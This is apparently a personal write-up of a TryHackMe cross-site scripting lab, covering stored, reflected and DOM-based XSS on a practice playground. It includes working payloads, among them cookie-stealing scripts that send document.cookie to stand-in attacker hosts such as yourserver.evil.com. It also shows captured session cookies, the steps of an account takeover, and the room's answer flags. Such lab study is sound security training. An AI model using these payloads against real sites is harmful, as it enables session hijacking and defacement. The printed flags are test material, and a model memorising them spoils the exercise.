---
Understand how cross-site scripting occurs and how to exploit it.
---

# Cross-site Scripting-1 — Writeup

## Overview
### Cross-site Scripting-1 — Writeup
### Cross-site Scripting-1 — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/9c4baf4b20519e6768ea155b23fa5e38.png)
### Introduction
Cross-site scripting (XSS) is a security vulnerability typically found in web applications. Its a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victims machine.
A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS.
The extent to the severity of this vulnerability depends on the type of XSS, which is normally split into two categories: persistent/stored and reflected. Depending on which, the following attacks are possible:
Cookie Stealing - Stealing your cookie from an authenticated session, allowing an attacker to login as you without themselves having to provide authentication.
Keylogging - An attacker can register a keyboard event listener and send all of your keystrokes to their own server.
Webcam snapshot - Using HTML5 capabilities its possible to even take snapshots from a compromised computer webcam.
Phishing - An attacker could either insert fake login forms into the page, or have you redirected to a clone of a site tricking you into revealing your sensitive data.
Port Scanning - You read that correctly. You can use stored XSS to scan an internal network and identify other hosts on their network.
Other browser based exploits - There are millions of possibilities with XSS.
Who knew this was all possible by just visiting a web-page. There are measures put in place to prevent this from happening by your browser and anti-virus.
This room will explain the different types of cross-Site scripting, attacks and require you to solve challenges along the way.
This room is for educational purposes only, carrying out attacks explained in this room without permission from the target is illegal. I take no responsibility for your actions, you need to learn how an attacker can exploit this vulnerability in order to ensure you're patching it properly.
### Deploy your XSS Playground
Attached to this task is a machine used for all questions in this room. Every task in this room has a page on the XSS Playground site, which includes a more in-depth explanation of the vulnerability in question and supporting challenges.
Here is a sneak peak of what your playground will look like:
![](https://i.imgur.com/MTbA186.png)
Deploy the machine and navigate to http://<ip>
### Stored XSS
Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
![](https://i.imgur.com/LCSFUTB.png)
An attacker creates a payload in a field when signing up to a website that is stored in the websites database. If the website doesn't properly sanitise that field, when the site displays that field on the page, it will execute the payload to everyone who visits it.
The payload could be as simple as <script>alert(1)</script>
However, this payload wont just execute in your browser but any other browsers that display the malicious data inserted into the database.
Lets experiment exploiting this type of XSS. navigate to the "Stored-XSS" page on the XSS playground.
```text
first register then login, go to stored xss
adding a comment
<img src=x onerror=alert('XSS');>
<h3>hi</h3>
or

<img src="https://i.insider.com/5ed7f5e0aee6a80f0b0cadb6" alt="BOO" width="500" height="600">

Successfully added a HTML comment! Answer for Q1: HTML_T4gs

You can get the pages documents using document.cookies in Javascript.

If you right click on this page, and select "Inspect Element", it will open your browsers Development Tools. You can execute Javascript in the console tab.

go to inspect then console

document.cookie
"connect.sid=s%3AdvBAMnOCE5GT9IzwI8jRpa4CBJiQuQPf.wtZL%2Br52BgM91skBnxshq9y8WrFfhzEziDGjOL%2BSzCY" 

so creating an alert pop up

<script>alert(document.cookie)</script>

W3LL_D0N3_LVL2

Now you know you can execute Javascript directly on the webpage, you can use it to change elements on the page

Try running this in your Developer Tools console
document.querySelector('#thm-title').textContent = 'Hey'

Did you notice anything change?

so looking

document.querySelector('#thm-title')
<span id="thm-title">

then will be
to replace XSS Playground

<script>document.querySelector(''#thm-title').textContent = 'I am a Hacker'</script>

or

<script>document.getElementById('thm-title').innerHTML="I am a hacker";</script>

Question 4

We have made things easy for you. Requesting /log/hello will log hello for you.

The logs page will show you everything logged to /log/any_text URL.

This means, if you write a malicious script to steal someones cookie, you can have it logged for you to take over their account

Posting <script>document.location='/log/'+document.cookie</script> will log everyones cookies. Make sure its not your cookie when you're visiting the logs page as you will have also visited this page again.. You can check this by looking at your cookies in the Developer Tools console and executing document.cookie.

Once your victim (in this case you hope its Jack), to visit this page, it will log his cookie for you to steal!You can also use other HTML tags to make requests, including the img tag
<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />

my cookie
document.cookie
"connect.sid=s%3AF3ki1_43pM1UZdiS4ms3Rl-Y8Zl3uIeV.Hb9PsrrHRA%2F7NSv8yN4RYrS5woN9NuBuyx4%2F7LNyZt8" 

then need jack's cookie

first see location in inspect

document.location

Location http://10.10.163.201/stored

so adding to steal cookie

<script>document.location='/log/'+document.cookie</script>

so going to
http://10.10.163.201/log
then visit cookies

s:F3ki1_43pM1UZdiS4ms3Rl-Y8Zl3uIeV.Hb9PsrrHRA/7NSv8yN4RYrS5woN9NuBuyx4/7LNyZt8

http://10.10.163.201/logs
Logs

Anything that makes a request to /log/:text will be logged. For example, /log/anything+can+go+here will get logged to this page.
10/3/2022, 1:03:43 AM : anything+can+go+here
10/3/2022, 1:02:40 AM : hello
10/3/2022, 12:59:00 AM : connect.sid s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE

then replace your cookie to jack going to inspect , storage,cookies ,value and replace

then comment like hi and got it!

Successfully added a comment as Jack! Question answer: c00ki3_stealing_

or using burpsuite

Burp Suite’s sitemap to log site.

Access logs.

so

<script>document.location='http://<ip>/log/'+document.cookie</script>
```
The machine you deployed earlier will guide you though exploiting some cool vulnerabilities, stored XSS has to offer. There are hints for answering these questions on the machine.
Add a comment and see if you can insert some of your own HTML.
Doing so will reveal the answer to this question.
*HTML_T4gs*
Create an alert popup box appear on the page with your document cookies.
*W3LL_D0N3_LVL2*
![[Pasted image 20221002193736.png]]
![[Pasted image 20221002194025.png]]
Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
*websites_can_be_easily_defaced_with_xss*
![[Pasted image 20221002211735.png]]
Stored XSS can be used to steal a victims cookie (data on a machine that authenticates a user to a webserver). This can be done by having a victims browser parse the following Javascript code:
<script>window.location='http://attacker/?cookie='+document.cookie</script>
This script navigates the users browser to a different URL, this new request will includes a victims cookie as a query parameter. When the attacker has acquired the cookie, they can use it to impersonate the victim.
![[Pasted image 20221002200014.png]]
![[Pasted image 20221002200609.png]]
Take over Jack's account by stealing his cookie, what was his cookie value?
*s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE*
Post a comment as Jack.
*c00ki3_stealing_*
![](https://miro.medium.com/max/720/1*E5Qlbprh2QGuJZ2hrsQsSQ.png)
![](https://miro.medium.com/max/720/1*ZA1YOyOTmDGgoimFtC9xTg.png)
### Reflected XSS
In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
This might seem harmless as it requires the victim to send a request containing an attackers payload, and a user wouldn't attack themselves. However, attackers could trick the user into clicking their crafted link that contains their payload via social-engineering them via email..
Reflected XSS is the most common type of XSS attack.
![](https://i.imgur.com/yX7zRh8.png)
An attacker crafts a URL containing a malicious payload and sends it to the victim. The victim is tricked by the attacker into clicking the URL. The request could be http://example.com/search?keyword=<script>...</script>
The website then includes this malicious payload from the request in the response to the user. The victims browser will execute the payload inside the response. The data the script gathered is then sent back to the attacker (it might not necessarily be sent from the victim, but to another website where the attacker then gathers this data - this protects the attacker from directly receiving the victims data).
```text
Why does this work?

When you submit anything in the search input, it will appear in the keyword query in your URL.

Remember, the main difference between reflected and dom based xss, is that with reflected xss your payload (string in this case) gets inputted directly into the page. No Javascript is loaded before hand, neither is anything processed in the DOM before hand.

Look at the source code, you will notice your payload is executed directly on the webpage.
<h6>You searched for: [Your input will be input directly in here]</h6>

This means any user input that is not sanatised will be executed.
Disable your browsers XSS protection

Some browsers have in-built XSS protection.

For the purposes of this playground it might be necessary to remove this protection. We recommended you use FireFox and complete the following steps:

    Go to the URL bar, type about:config
    Search for browser.urlbar.filter.javascript
    Change the boolean value from True to False

However, bypassing browsers filters is easier than you think. We will get onto this in the Filter Evasion section.

http://10.10.163.201/reflected?keyword=alert%28%27Hello%27%29

just in keyword alert('Hello')

Answer: ThereIsMoreToXSSThanYouThink

You searched for: alert('Hello')

to get ip

window.location.hostname

"10.10.163.201"

so 

You searched for: 

alert(window.location.hostname)

Answer: ReflectiveXss4TheWin
```
![[Pasted image 20221002202313.png]]
Craft a reflected XSS payload that will cause a popup saying "Hello"
*ThereIsMoreToXSSThanYouThink*
Craft a reflected XSS payload that will cause a popup with your machines IP address.
In Javascript window.location.hostname will show your hostname, in this case your deployed machine's hostname will be its up.
*ReflectiveXss4TheWin*
### DOM-Based XSS
What is the DOM
DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:
![](https://www.w3schools.com/js/pic_htmltree.gif)
With the object mode, Javascript gets all the power it needs to create dynamic HTML. More information can be found on w3schools website.
https://www.w3schools.com/js/js_htmldom.asp
In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. So what does this mean?
With reflective xss, an attackers payload will be injected directly on the website and will not matter when other Javascript on the site gets loaded.
<html>
You searched for <em><script>...</script></em>
</html
With DOM-Based xss, an attackers payload will only be executed when the vulnerable Javascript code is either loaded or interacted with. It goes through a Javascript function like so:
var keyword = document.querySelector('#search')
keyword.innerHTML = <script>...</script>
```text
<script>
      // LOOK HERE!
      document.querySelector('#update').addEventListener("click", function() {
        let imgURL = document.querySelector('#img-url').value // input URL
        const imgEl = document.querySelector('#img') // Image div element
        imgEl.innerHTML = '<img src="' + imgURL + '" alt="Image not found.." width=400>' // Creating image element
      });
    </script>

test" onmouseover="alert('Hover over the image and inspect the image element')"

so

test" onmouseover="alert(document.cookie)"
Answer: BreakingAnElementsTag

or

"onmouseover="alert(document.cookie)"

nothing happens after

test" onhover="document.body.style.backgroundColor = 'red';

so

with onmouseover

test" onmouseover="document.body.style.backgroundColor = 'red';

Answer: JavascriptIsAwesome
